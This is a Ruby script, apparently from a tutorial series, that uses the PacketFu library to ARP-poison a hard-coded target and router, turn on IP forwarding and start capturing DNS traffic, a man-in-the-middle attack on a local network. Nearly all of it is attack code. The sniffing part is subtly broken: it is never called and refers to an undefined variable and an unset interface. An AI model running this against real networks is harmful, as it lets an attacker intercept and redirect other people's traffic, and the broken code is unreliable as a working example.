#!/usr/bin/ruby
require 'rubygems'
require 'packetfu'
require 'thread'
require 'macaddr'

### User Defined ###############################

target_ip = '192.168.0.9'
router_ip = '192.168.0.100'

################################################

# Get the mac addresses for all the necessary machines.
sender_mac = Mac.addr
`ping -c 1 #{target_ip}`
target_mac = `arp | grep #{target_ip} | awk '{ print $3} '`
router_mac = `arp | grep #{router_ip} | awk '{ print $3} '`

# Builds on the previous ARP spoofing example.
# The sending of ARP packets is done in a separate thread.

# Construct the target's packet
arp_packet_target = PacketFu::ARPPacket.new()
arp_packet_target.eth_saddr = sender_mac       # sender's MAC address
arp_packet_target.eth_daddr = target_mac       # target's MAC address
arp_packet_target.arp_saddr_mac = sender_mac   # sender's MAC address
arp_packet_target.arp_daddr_mac = target_mac   # target's MAC address
arp_packet_target.arp_saddr_ip = router_ip        # router's IP
arp_packet_target.arp_daddr_ip = target_ip         # target's IP
arp_packet_target.arp_opcode = 2                        # arp code 2 == ARP reply

# Construct the router's packet
arp_packet_router = PacketFu::ARPPacket.new()
arp_packet_router.eth_saddr = sender_mac       # sender's MAC address
arp_packet_router.eth_daddr = router_mac       # router's MAC address
arp_packet_router.arp_saddr_mac = sender_mac   # sender's MAC address
arp_packet_router.arp_daddr_mac = router_mac   # router's MAC address
arp_packet_router.arp_saddr_ip = target_ip         # target's IP
arp_packet_router.arp_daddr_ip = router_ip        # router's IP
arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply

# Enable IP forwarding
`echo 1 > /proc/sys/net/ipv4/ip_forward`

def runspoof(arp_packet_target,arp_packet_router)
  # Send out both packets
  puts "Spoofing...."
  caught=false
  while caught==false do
    sleep 1
    arp_packet_target.to_w(@interface)
    arp_packet_router.to_w(@interface)
  end
end

# Opens up the nic for capture.
def sniff(iface)
  pp 'Sniffing...'
  cap = Capture.new(:iface => iface, :start => true, :filter => 'udp and port 53', :save => true)
  cap.stream.each do |p|
    pp 'Got one!'
    packet = Packet.parse p
    $dnsQuery = packet.payload[2].unpack('h*')[0].chr+pkt.payload[3].unpack('h*')[0].chr
  end


end

begin
  puts "Starting the ARP poisoning thread..."
  spoof_thread = Thread.new{runspoof(arp_packet_target,arp_packet_router)}
  spoof_thread.join
    # Catch the interrupt and kill the thread
rescue Interrupt
  puts "\nARP spoof stopped by interrupt signal."
  Thread.kill(spoof_thread)
  `echo 0 > /proc/sys/net/ipv4/ip_forward`
  exit 0
end